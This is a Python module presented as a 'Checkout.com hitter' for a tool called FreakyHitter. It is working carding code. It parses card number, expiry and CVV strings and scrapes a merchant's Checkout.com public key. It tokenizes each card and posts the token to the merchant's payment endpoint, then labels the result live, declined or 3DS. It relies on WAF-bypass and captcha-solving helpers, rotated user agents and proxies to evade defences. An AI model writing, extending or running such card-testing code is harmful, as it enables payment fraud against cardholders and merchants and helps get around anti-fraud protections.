"""
Checkout.com hitter for FreakyHitter integration.
Supports direct card tokenization + charge via Checkout.com API.
"""
import re
import json
import time
import random
import asyncio
import aiohttp
from typing import Optional, Dict, Any, Tuple
from urllib.parse import urlparse, urlencode

from .waf_solver import get_bypass_headers, bypass_waf
from .captcha_solver import solve_captcha, detect_captcha_type
from .curl_compat import create_connector

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
]

CKO_TOKENIZE_URL = "https://api.checkout.com/tokens"


def parse_card(card_str: str) -> Optional[Tuple[str, str, str, str]]:
    """Parse CC|MM|YY|CVV or CC|MM|YYYY|CVV format."""
    parts = re.split(r'[|/\s]', card_str.strip())
    if len(parts) < 4:
        return None
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 4:
        yy = yy[2:]
    if not cc.isdigit() or len(cc) < 13:
        return None
    return cc, mm, yy, cvv


def _get_headers(url: str, public_key: str) -> Dict[str, str]:
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
        "Authorization": public_key,
        "Origin": f"{urlparse(url).scheme}://{urlparse(url).netloc}",
        "Referer": url,
    }


async def _extract_checkout_public_key(session: aiohttp.ClientSession, url: str, proxy: Optional[str]) -> Optional[str]:
    """Extract Checkout.com public key from the checkout page."""
    try:
        headers = get_bypass_headers(url)
        async with session.get(url, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=20), allow_redirects=True) as resp:
            html = await resp.text(errors="ignore")

        # Look for pk_live_ or pk_test_ keys
        key_match = re.search(r'(pk_(?:live|test)_[a-zA-Z0-9]{20,})', html)
        if key_match:
            return key_match.group(1)

        # Try JavaScript context
        js_match = re.search(r'["\']publicKey["\']\s*:\s*["\']([^"\']+)["\']', html)
        if js_match:
            return js_match.group(1)

        # Try data attributes
        attr_match = re.search(r'data-(?:public-)?key=["\']([^"\']+)["\']', html)
        if attr_match:
            return attr_match.group(1)

    except Exception:
        pass
    return None


async def _tokenize_card(session: aiohttp.ClientSession, cc: str, mm: str, yy: str, cvv: str, public_key: str, site_url: str, proxy: Optional[str]) -> Optional[str]:
    """Tokenize card via Checkout.com API."""
    payload = {
        "type": "card",
        "number": cc,
        "expiry_month": int(mm),
        "expiry_year": int("20" + yy if len(yy) == 2 else yy),
        "cvv": cvv,
    }
    headers = _get_headers(site_url, public_key)

    try:
        async with session.post(
            CKO_TOKENIZE_URL,
            json=payload,
            headers=headers,
            proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=20),
        ) as resp:
            data = await resp.json(content_type=None)
            return data.get("token")
    except Exception:
        return None


async def _find_payment_endpoint(session: aiohttp.ClientSession, url: str, proxy: Optional[str]) -> Optional[str]:
    """Find the payment submission endpoint from the checkout page."""
    try:
        headers = get_bypass_headers(url)
        async with session.get(url, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=20), allow_redirects=True) as resp:
            html = await resp.text(errors="ignore")

        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Look for form action
        form_action = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', html, re.IGNORECASE)
        if form_action:
            action = form_action.group(1)
            if action.startswith("/"):
                return base + action
            if action.startswith("http"):
                return action

        # Look for AJAX endpoint in JS
        ajax_ep = re.search(r'["\'](?:action|endpoint|url)["\']:\s*["\']([^"\']+(?:payment|charge|order)[^"\']*)["\']', html, re.IGNORECASE)
        if ajax_ep:
            ep = ajax_ep.group(1)
            if ep.startswith("/"):
                return base + ep
            if ep.startswith("http"):
                return ep

    except Exception:
        pass
    return None


async def hit_checkout(url: str, card_str: str, proxy: Optional[str] = None) -> Dict[str, Any]:
    """
    Hit a Checkout.com powered payment page.
    Returns dict with status, message, gateway, time_taken.
    """
    start = time.time()

    parsed = parse_card(card_str)
    if not parsed:
        return {"status": "error", "message": "Invalid card format", "gateway": "Checkout.com", "time_taken": 0}

    cc, mm, yy, cvv = parsed

    connector = create_connector()
    async with aiohttp.ClientSession(
        connector=connector,
        cookie_jar=aiohttp.CookieJar(unsafe=True),
    ) as session:
        # 1. Get public key
        public_key = await _extract_checkout_public_key(session, url, proxy)
        if not public_key:
            return {"status": "error", "message": "Could not extract Checkout.com public key", "gateway": "Checkout.com", "time_taken": round(time.time() - start, 2)}

        # 2. Tokenize card
        token = await _tokenize_card(session, cc, mm, yy, cvv, public_key, url, proxy)
        if not token:
            return {"status": "error", "message": "Card tokenization failed", "gateway": "Checkout.com", "time_taken": round(time.time() - start, 2)}

        # 3. Submit token to payment endpoint
        payment_url = await _find_payment_endpoint(session, url, proxy)
        if not payment_url:
            payment_url = url  # Fallback to original URL

        parsed_url = urlparse(url)
        submit_headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": f"{parsed_url.scheme}://{parsed_url.netloc}",
            "Referer": url,
        }

        payload = {
            "token": token,
            "cko-card-token": token,
            "card_token": token,
        }

        try:
            async with session.post(
                payment_url,
                json=payload,
                headers=submit_headers,
                proxy=proxy,
                timeout=aiohttp.ClientTimeout(total=30),
                allow_redirects=True,
            ) as resp:
                text = await resp.text(errors="ignore")
                status_code = resp.status

                time_taken = round(time.time() - start, 2)
                result = _classify_response(text, status_code)
                result["gateway"] = "Checkout.com"
                result["time_taken"] = time_taken
                return result

        except asyncio.TimeoutError:
            return {"status": "error", "message": "Request timed out", "gateway": "Checkout.com", "time_taken": round(time.time() - start, 2)}
        except Exception as e:
            return {"status": "error", "message": str(e)[:100], "gateway": "Checkout.com", "time_taken": round(time.time() - start, 2)}


def _classify_response(text: str, status_code: int) -> Dict[str, str]:
    """Classify the payment response."""
    lower = text.lower()

    live_keywords = ["payment successful", "order confirmed", "thank you", "success", "approved", "authorized", "payment_approved", "paid", "complete"]
    decline_keywords = ["declined", "insufficient funds", "do not honor", "invalid card", "card declined", "insufficient_funds", "do_not_honor", "restricted_card"]
    threeds_keywords = ["3ds", "3d secure", "authentication", "redirect", "requires_action", "pending"]
    error_keywords = ["error", "invalid", "failed", "failure", "exception"]

    if any(kw in lower for kw in live_keywords):
        return {"status": "live", "message": "Payment Approved ✅"}
    if any(kw in lower for kw in threeds_keywords):
        return {"status": "3ds", "message": "3D Secure Required 🔐"}
    if any(kw in lower for kw in decline_keywords):
        msg = "Card Declined"
        for kw in ["insufficient_funds", "insufficient funds"]:
            if kw in lower:
                msg = "Insufficient Funds"
                break
        for kw in ["do_not_honor", "do not honor"]:
            if kw in lower:
                msg = "Do Not Honor"
                break
        return {"status": "decline", "message": msg + " ❌"}
    if status_code in (200, 201):
        return {"status": "live", "message": "Payment Processed ✅"}
    if status_code in (400, 402):
        return {"status": "decline", "message": "Card Rejected ❌"}

    return {"status": "decline", "message": f"Unknown Response (HTTP {status_code}) ⚠️"}
